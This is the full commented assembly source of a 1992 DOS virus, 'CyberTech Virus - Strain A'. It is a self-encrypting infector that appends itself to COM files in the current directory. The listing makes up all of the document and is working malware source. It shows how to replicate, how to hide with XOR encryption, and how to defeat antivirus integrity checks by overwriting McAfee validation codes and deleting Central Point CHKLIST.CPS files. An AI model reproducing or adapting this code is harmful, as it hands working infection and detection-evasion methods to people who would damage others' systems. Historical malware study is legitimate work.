;
;  CyberTech Virus - Strain A                           John Tardy (C) 1992
;
;  Written in A86 V3.22
;
;  Description : This is a Non-Resident Self-Encrypting .COM file infector
;                which infects COM files in the current directory. It will
;                remove CHKLIST.CPS from the current directory after it has
;                infected a program. CHKLIST.CPS is a file which is used by
;                VDEFEND of PCSHELL and Central Point AntiVirus. When a
;                validation code is added by SCAN of McAfee, it will overwrite
;                the code, so the file is no longer CRC protected anymore.
;                After 1992, the virus activated. It then displays a message
;                that your system has been infected. The virus will remove
;                itself from the infected file and completely restore it. If
;                a validation code was added, it is lost, but the file is not
;                corrupted and will function normally. Even when the file is
;                compressed afterwards by an executable file compressor, it is
;                uncompressed. Before 1993, the virus sometimes display it's
;                copyright. This is caused when the random encryption counter
;                is a 0. It will redefine it, so there is no visible text in
;                the virus. It checks also if there is enough diskspace
;                aveable and installs a critical error handler.
;
            Org 0h                              ; Generate .BIN file

Start:      Jmp MainVir                         ; Jump to decryptor code at EOF

            Db '*'                              ; Virus signature (very short)

;
; Decryptor procedure
;

MainVir:    Call On1                            ; Push offset on stack

On1:        Pop BP                              ; Calculate virus offset
            Sub BP,Offset MainVir+3             ;

            Push Ax                             ; Save possible error code

            Lea Si,Crypt[BP]                    ; Decrypt the virus with a
            Mov Di,Si                           ; very simple exclusive or
            Mov Cx,CryptLen                     ; function.
Decrypt:    Lodsb                               ;
            Xor Al,0                            ;
            Stosb                               ;
            Loop Decrypt                        ;

DecrLen     Equ $-MainVir                       ; Length of the decryptor

;
; Main initialization procedure
;

Crypt:      Mov Ax,Cs:OrgPrg[BP]                ; Store begin of host at
            Mov Bx,Cs:OrgPrg[BP]+2              ; cs:100h (begin of com)
            Mov Cs:Start+100h,Ax                ;
            Mov Cs:Start[2]+100h,Bx             ;

            Xor Ax,Ax                           ; Get original interrupt 24
            Push Ax                             ; (critical error handler)
            Pop Ds                              ;
            Mov Bx,Ds:[4*24h]                   ;
            Mov Es,Ds:[4*24h]+4                 ;

            Mov Word Ptr Cs:OldInt24[Bp],Bx     ; And store it on a save place
            Mov Word Ptr Cs:OldInt24+2[Bp],Es   ;

            Lea Bx,NewInt24[Bp]                 ; Install own critical error
            Push Cs                             ; handler to avoid messages
            Pop Es                              ; when a disk is write
            Mov Word Ptr Ds:[4*24h],Bx          ; protected and such things
            Mov Word Ptr Ds:[4*24h]+2,Es        ;
            Push Cs                             ;
            Pop Ds                              ;

            Mov Ah,30h                          ; Check if DOS version is
            Int 21h                             ; 3.0 or above for correct
            Cmp Al,3                            ; interrupt use
            Jae On2                             ;
            Jmp Ready                           ;

On2:        Mov Ax,3600h                        ; Check if enough disk space
            Xor Dx,Dx                           ; is aveable for infecting
            Int 21h                             ; (3 clusters should be
            Cmp Bx,3                            ; enough i think)
            Ja  TestDate                        ;
            Jmp Ready                           ;

TestDate:   Mov Ah,2ah                          ; Check if 1992 is past time
            Int 21h                             ; already
            Cmp Cx,1993                         ;
            Jae Clean                           ; - 1993 or more
            Jmp NoClean                         ; - Not 1993 or more

;
; Main Cleanup procedure
;

Clean:      Push Cs                             ; Show message that the
            Pop Ds                              ; system has been infected
            Mov Ah,9                            ;
            Lea Dx,Removed[Bp]                  ;
            Int 21h                             ;

            Mov Ah,1ah                          ; Move DTA to a safe place
            Mov Dx,0fd00h                       ;
            Int 21h                             ;

            Mov Ax,Cs:[2ch]                     ; Find the name of the
            Mov Ds,Ax                           ; program that is now
            Mov Si,0                            ; executed (me must search in
            Mov Cx,4000h                        ; the DOS environment for
Seeker:     Lodsb                               ; safe tracking of the name
            Cmp Al,1                            ;
            Je On3                              ;
            Loop Seeker                         ;

On3:        Inc Si                              ; Transfer the found name
            Push Cs                             ; to a safe address in memory
            Pop Es                              ;
            Mov Di,0fd80h                       ;
            Mov Cx,80h                          ;
Trans:      Lodsb                               ;
            Cmp Al,0h                           ;
            Jne Verder                          ;
            Xor Ax,Ax                           ;
Verder:     Stosb                               ;
            Loop Trans                          ;

            Push Cs                             ; Read file attributes and
            Pop Ds                              ; check if an error has
            Mov Ax,4300h                        ; occured
            Mov Dx,0fd80h                       ;
            Int 21h                             ;
            Jnc DeInfect                        ; - No error, DeInfect
            Jmp Ready                           ; - Error, Ready

DeInfect:   Push Cx                             ; Store old file attributes

            Mov Ax,4301h                        ; Clear file attributes
            Xor Cx,Cx                           ; (for read only etc.)
            Int 21h                             ;

            Mov Ax,3d02h                        ; Open the file
            Int 21h                             ;

            Mov Bx,Ax                           ; Read file date/time stamp
            Mov Ax,5700h                        ; and store it on the stack
            Int 21h                             ; for later use
            Push Cx                             ;
            Push Dx                             ;

            Mov Ah,3eh                          ; Close file
            Int 21h                             ;

            Mov Dx,0fd80h                       ; Create a new file with the
            Xor Cx,Cx                           ; same name
            Mov Ah,3ch                          ;
            Int 21h                             ;

            Mov Bx,Ax                           ; store file handle in BX

            Mov Ah,40h                          ; write memory image of host
            Mov Dx,100h                         ; program to file (the original
            Mov Cx,Bp                           ; file is now back again)
            Sub Cx,0fch                         ;
            Int 21h                             ;

            Pop Dx                              ; restore file date/time
            Pop Cx                              ; stamp
            Mov Ax,5701h                        ;
            Int 21h                             ;

            Mov Ah,3eh                          ; close file
            Int 21h                             ;

            Pop Cx                              ; restore file attributes
            Mov Ax,4301h                        ;
            Mov Dx,0fd80h                       ;
            Int 21h                             ;

            Push Cs                             ; jump to ready routine
            Pop Ds                              ; (shutdown of the virus)
            Jmp Ready                           ;

;
; Main viral part
;

NoClean:    Mov Ah,1ah                          ; Store DTA at safe place
            Mov Dx,0fd00h                       ;
            Int 21h                             ;

            Mov Ah,4eh                          ; FindFirsFile Function

Search:     Lea Dx,FileSpec[BP]                 ; Search for filespec given
            Xor Cx,Cx                           ; in FileSpec adress
            Int 21h                             ;
            Jnc Found                           ; Found - Found
            Jmp Ready                           ; Not Found - Ready

Found:      Mov Ax,4300h                        ; Get file attributes and
            Mov Dx,0fd1eh                       ; store them on the stack
            Int 21h                             ;
            Push Cx                             ;

            Mov Ax,4301h                        ; clear file attributes
            Xor Cx,Cx                           ;
            Int 21h                             ;

            Mov Ax,3d02h                        ; open file with read/write
            Int 21h                             ; access

            Mov Bx,5700h                        ; save file date/time stamp
            Xchg Ax,Bx                          ; on the stack
            Int 21h                             ;
            Push Cx                             ;
            Push Dx                             ;

            Mov Ah,3fh                          ; read the first 4 bytes of
            Lea Dx,OrgPrg[BP]                   ; the program onto OrgPrg
            Mov Cx,4                            ;
            Int 21h                             ;

            Mov Ax,Cs:[OrgPrg][BP]              ; Check if renamed exe-file
            Cmp Ax,'ZM'                         ;
            Je ExeFile                          ;

            Cmp Ax,'MZ'                         ; Check if renamed weird exe-
            Je ExeFile                          ; file

            Mov Ah,Cs:[OrgPrg+3][BP]            ; Check if already infected
            Cmp Ah,'*'                          ;
            Jne Infect                          ;

ExeFile:    Call Close                          ; If one of the checks is yes,
            Mov Ah,4fh                          ; close file and search next
            Jmp Search                          ; file

FSeek:      Xor Cx,Cx                           ; subroutine to jump to end
            Xor Dx,Dx                           ; or begin of file
            Int 21h                             ;
            Ret                                 ;

Infect:     Mov Ax,4202h                        ; jump to EOF
            Call FSeek                          ;

            Cmp Ax,0f900                        ; Check if file too large
            Jae ExeFile                         ; if yes, goto exefile

            Cmp Ax,10                           ; Check if file too short
            Jbe ExeFile                         ; if yes, goto exefile

            Mov Cx,Dx                           ; calculate pointer to offset
            Mov Dx,Ax                           ; EOF-52 (for McAfee validation
            Sub Dx,52                           ; codes)

            Mov Si,Cx                           ; move file pointer to the
            Mov Di,Dx                           ; calculated address
            Mov Ax,4200h                        ;
            Int 21h                             ;

            Mov Ah,3fh                          ; read the last 52 bytes
            Mov Dx,0fb00h                       ; of the file
            Mov Cx,52                           ;
            Int 21h                             ;

            Cmp Ds:0Fb00h,0fdf0h                ; check if protected with the
            Jne Check2                          ; AG option
            Cmp Ds:0fb02h,0aac5h                ;
            Jne Check2                          ;

            Mov Ax,4200h                        ; yes - let virus overwrite
            Mov Cx,Si                           ; the code with itself, so
            Mov Dx,Di                           ; the file has no validation
            Int 21h                             ; code
            Jmp CalcVirus                       ;

Check2:     Cmp Ds:0Fb00h+42,0fdf0h             ; check if protected with the
            Jne Eof                             ; AV option
            Cmp Ds:0Fb02h+42,0aac5h             ;
            Jne Eof                             ;

            Mov Ax,4200h                        ; yes - let virus overwrite
            Mov Cx,Si                           ; the code with itself, so
            Mov Dx,Di                           ; the file has no validation
            Add Dx,42                           ; code
            Int 21h                             ;
            Jmp CalcVirus                       ;

Eof:        Mov Ax,4202h                        ; not AG or AV - jump to
            Call Fseek                          ; EOF

CalcVirus:  Sub Ax,3                            ; calculate the jump for the
            Mov Cs:CallPtr[BP]+1,Ax             ; virus start

GetCrypt:   Mov Ah,2ch                          ; get 100s seconds for the
            Int 21h                             ; encryption value.
            Cmp Dl,0                            ; if not zero, goto NoZero
            Jne NoZero                          ;

            Mov Ah,9                            ; If zero, display copyright
            Lea Dx,Msg[Bp]                      ; message and generate again
            Int 21h                             ; a number
            Jmp GetCrypt                        ;

NoZero:     Mov Cs:Decrypt+2[BP],Dl             ; Store key into decryptor

            Lea Si,MainVir[BP]                  ; Move changed decryptor to
            Mov Di,0fb00h                       ; a safe place in memory
            Mov Cx,DecrLen                      ;
            Rep Movsb                           ;

            Lea Si,Crypt[BP]                    ; Encrypt the virus and merge
            Mov Cx,CryptLen                     ; it to the changed decryptor
Encrypt:    Lodsb                               ; code
            Xor Al,Dl                           ;
            Stosb                               ;
            Loop Encrypt                        ;

            Mov Ah,40h                          ; append virus at EOF or over
            Lea Dx,0fb00h                       ; the validation code of
            Mov Cx,VirLen                       ; McAfee
            Int 21h                             ;

            Mov Ax,4200h                        ; Jump to BOF
            Call FSeek                          ;

            Mov Ah,40h                          ; Write Jump at BOF
            Lea Dx,CallPtr[BP]                  ;
            Mov Cx,4                            ;
            Int 21h                             ;

            Call Close                          ; Jump to Close routine

Ready:      Mov Ah,1ah                          ; Restore DTA to normal
            Mov Dx,80h                          ; offset
            Int 21h                             ;

            Mov Ax,Cs:OldInt24[Bp]              ; remove critical error
            Mov Dx,Cs:OldInt24+2[Bp]            ; handler and store the
            Xor Bx,Bx                           ; original handler at the
            Push Bx                             ; interrupt table
            Pop Ds                              ;
            Mov Ds:[4*24h],Dx                   ;
            Mov Ds:[4*24h]+2,Ax                 ;
            Push Cs                             ;
            Pop Ds                              ;

            Pop Ax                              ; restore possible error code

            Mov Bx,100h                         ; nice way to jump to the
            Push Cs                             ; begin of the original host
            Push Bx                             ; code
            Retf                                ;

Close:      Pop Si                              ; why???

            Pop Dx                              ; restore file date/time
            Pop Cx                              ; stamp
            Mov Ax,5701h                        ;
            Int 21h                             ;

            Mov Ah,3eh                          ; close file
            Int 21h                             ;

            Mov Ax,4301h                        ; restore file attributes
            Pop Cx                              ;
            Mov Dx,0fd1eh                       ;
            Int 21h                             ;

            Mov Ah,41h                          ; delete CHKLIST.CPS (the
            Lea Dx,CpsName[BP]                  ; Central Point CRC list)
            Int 21h                             ;

            Push Si                             ; why???
            Ret

;
; Message when we are in 1993
;

Removed     Db 13,10,'The previous year you have been infected by a virus'
            Db 13,10,'without knowing or removing it. To be gentle to you'
            Db 13,10,'I decided to remove myself from your system. I suggest'
            Db 13,10,'you better buy ViruScan of McAfee to ensure yourself'
            Db 13,10,'complete security of your precious data. Next time you'
            Db 13,10,'could be infected with a malevolent virus.'
            Db 13,10,10,'May I say goodbye to you for now....',13,10

;
; Message when encryption byte = 0 or when we are living in 1993
;

Msg         Db 13,10,'CyberTech Virus - Strain A'
            Db 13,10,'(C) 1992 John Tardy of Trident'
            Db 13,10,'$'

;
; New critical error handler
;

NewInt24:   Mov Al,3                            ; supress any critical error
            Iret                                ; messages

CpsName     Db 'chklist.cps',0                  ; name for CP CRC-list

OldInt24    Dd 0                                ; storage place for old int 24

CallPtr     Db 0e9h,0,0                         ; jump to place at BOF

FileSpec    Db '*.COM',0                        ; filespec and infection marker

OrgPrg:     Int 20h                             ; original program
            Db 'JT'                             ;

CryptLen    Equ $-Crypt                         ; encrypted part length

VirLen      Equ $-MainVir                       ; total virus length
